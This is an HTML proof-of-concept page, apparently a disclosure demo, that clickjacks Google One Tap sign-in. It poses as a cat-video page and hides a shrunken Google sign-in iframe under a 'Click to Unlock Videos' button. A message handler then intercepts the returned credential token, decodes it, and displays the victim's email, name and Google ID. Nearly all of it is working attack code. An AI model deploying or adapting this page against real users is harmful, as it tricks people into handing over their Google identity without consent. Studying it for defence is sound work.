<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        .container {
            max-width: 800px;
            margin: 2rem auto;
        }
        .video-container {
            position: relative;
            width: 500px;
            height: 300px;
            margin: 20px auto;
            overflow: hidden;
            border-radius: 15px;
            box-shadow: 0 0 15px rgba(0,0,0,0.2);
        }
        #google-frame {
            transform: scale(0.25);
            transform-origin: top left;
            width: 2000px;
            height: 1200px;
            border: none;
            opacity: 1;
            pointer-events: none;
        }
        .cta-button {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 2147483647;
            padding: 20px 40px;
            border: none;
            border-radius: 50px;
            background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
            color: white;
            font-size: 1.5em;
            cursor: pointer;
            transition: all 0.3s ease;
            opacity: 0.9;
        }
        .cta-button:hover {
            opacity: 1;
            box-shadow: 0 0 20px rgba(255,107,107,0.5);
        }
        #result {
            display: none;
            margin-top: 2rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="text-center mb-4">Watch Hilarious Cat Videos! üòª</h1>
        
        <div class="video-container">
            <iframe id="google-frame" 
                    src="https://pocs.work/pocs/2024/google-one-tap-clickjacking/gis.html"></iframe>
            <button class="cta-button">
                üêæ Click to Unlock Videos! üêæ
            </button>
        </div>

        <div id="result" class="card">
            <div class="card-header bg-danger text-white">
                üö® Account Information Collected
            </div>
            <div class="card-body">
                <div id="victim-info"></div>
                <pre id="jwt-payload" class="bg-light p-3 mt-3 rounded"></pre>
            </div>
        </div>
    </div>

    <script>
        // Enable pointer events after initial load
        document.getElementById('google-frame').onload = function() {
            setTimeout(() => {
                this.style.pointerEvents = 'auto';
                this.style.transform = 'scale(0.25)'; // Maintain visual hiding
            }, 1000);
        };

        // Enhanced JWT parser with proper padding
        const parseJWT = (token) => {
            try {
                const base64Url = token.split('.')[1];
                let base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
                const padLength = (4 - (base64.length % 4)) % 4;
                base64 += '='.repeat(padLength);
                
                const decoded = decodeURIComponent(
                    atob(base64)
                    .split('')
                    .map(c => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2))
                    .join('')
                );

                return JSON.parse(decoded);
            } catch (e) {
                return null;
            }
        };

        // Handle credential interception
        window.onmessage = (e) => {
            if (!e.data.credential) return;

            const payload = parseJWT(e.data.credential);
            if (!payload || !payload.email) return;

            // Show results section
            document.getElementById('result').style.display = 'block';

            // Display victim information
            const infoContainer = document.getElementById('victim-info');
            infoContainer.innerHTML = `
                <h5 class="card-title">üïµÔ∏è Victim Identified</h5>
                <p class="lead">Email: <strong>${payload.email}</strong></p>
                <p>Name: ${payload.name || 'Not available'}</p>
                <p>Google ID: <code>${payload.sub}</code></p>
            `;

            // Display full JWT payload
            document.getElementById('jwt-payload').textContent = 
                JSON.stringify(payload, null, 2);
        };
    </script>
</body>
